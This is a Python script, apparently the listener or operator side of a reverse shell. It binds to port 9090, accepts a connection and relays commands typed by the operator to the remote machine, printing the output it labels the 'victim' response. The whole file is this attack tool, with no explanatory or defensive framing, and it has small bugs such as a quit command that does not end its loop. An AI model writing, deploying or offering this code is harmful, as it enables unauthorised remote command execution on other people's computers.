#! /usr/bin/env python3

import socket

def create_socket():
    try:
        global s
        global host
        global port

        host = ""
        port = 9090
        s = socket.socket()
    except socket.error as msg:
        print("[-]Error creating the socket" , str(msg))

def bind_socket():
    try:
        s.bind((host,port))
        print("Listening for the incoming connections...\n")
        s.listen(5)
    except socket.error as msg:
        print("[-]Error binding the socket...", str(msg) , "\n Retrying to solve the Issue..")
        bind_socket()

def accept_connection():
    connec,address = s.accept()
    print("[+]Connection successfully established!!\n  IP :"+ address[0] +"   PORT :" + str(address[1]))
    send_commands(connec)

def send_commands(connec):
    while True:
        cmd = input()
        if cmd == 'quit':
            connec.close()
            s.close()
        if len(str.encode(cmd)) > 0:
            connec.send(str.encode(cmd))
            vict_resp = str(connec.recv(1024), "utf-8")
            print(vict_resp , end="")
def main():
    create_socket()
    bind_socket()
    accept_connection()

main()
